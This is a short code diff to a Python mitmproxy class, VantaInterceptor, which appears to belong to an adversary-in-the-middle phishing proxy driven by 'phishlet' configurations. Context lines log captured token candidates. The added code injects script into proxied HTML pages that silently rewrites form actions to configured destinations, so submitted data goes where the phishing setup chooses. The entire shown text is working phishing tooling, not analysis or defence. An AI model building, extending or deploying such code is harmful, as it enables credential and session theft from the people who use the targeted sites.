@@ -211,7 +211,6 @@ class VantaInterceptor:
                     self.logger.info(f"Captured token candidate: {name}")
 
     def _inject_scripts(self, flow: http.HTTPFlow):
-        """Inject JS into HTML responses"""
         if "text/html" in flow.response.headers.get("content-type", ""):
             for injection in self.phishlet.injections:
                 if injection.position == "body_end":
@@ -219,3 +218,14 @@ class VantaInterceptor:
                         "</body>", 
                         f"<script>{injection.content}</script></body>"
                     )
+            if getattr(self.phishlet, "form_actions", []):
+                parts = []
+                for r in self.phishlet.form_actions:
+                    sel = r.selector.replace("'", "\\'")
+                    act = r.action_to.replace("'", "\\'")
+                    parts.append(f"document.querySelectorAll('{sel}').forEach(function(f){{try{{f.setAttribute('action','{act}')}}catch(e){{}}}});")
+                js = "(function(){try{" + "".join(parts) + "}catch(e){}})();"
+                flow.response.text = flow.response.text.replace(
+                    "</body>",
+                    f"<script>{js}</script></body>"
+                )
